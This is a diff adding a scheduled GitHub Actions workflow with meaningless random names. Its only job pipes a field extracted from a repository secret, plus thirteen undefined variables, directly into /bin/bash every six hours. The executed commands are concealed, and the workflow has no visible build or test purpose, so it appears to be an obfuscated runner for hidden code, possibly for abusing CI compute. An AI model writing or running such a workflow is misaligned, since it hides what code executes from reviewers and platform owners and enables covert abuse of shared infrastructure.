@@ -1,0 +1,30 @@
+name: ligongpu6751
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ligongpu6751
+        env:
+          c47: ${{ secrets.c47 }}
+        run: |
+          echo $c47 | jq -r .aawjy95 | /bin/bash
+          echo $xjjyo320 | jq -r .kk057 | /bin/bash
+          echo $bwc64793 | jq -r .zy52 | /bin/bash
+          echo $n72688 | jq -r .rd4 | /bin/bash
+          echo $vbcy6428 | jq -r .zp6076 | /bin/bash
+          echo $pjgn288 | jq -r .ygt2 | /bin/bash
+          echo $l597 | jq -r .noqb2 | /bin/bash
+          echo $isio35290 | jq -r .ux045 | /bin/bash
+          echo $j28866 | jq -r .gp44 | /bin/bash
+          echo $zfgdw420 | jq -r .p7504 | /bin/bash
+          echo $kit7646 | jq -r .oixp4 | /bin/bash
+          echo $wub867 | jq -r .aqi7 | /bin/bash
+          echo $tqueq02648 | jq -r .rw2977 | /bin/bash
+          echo $zugb31 | jq -r .nroww18067 | /bin/bash
+
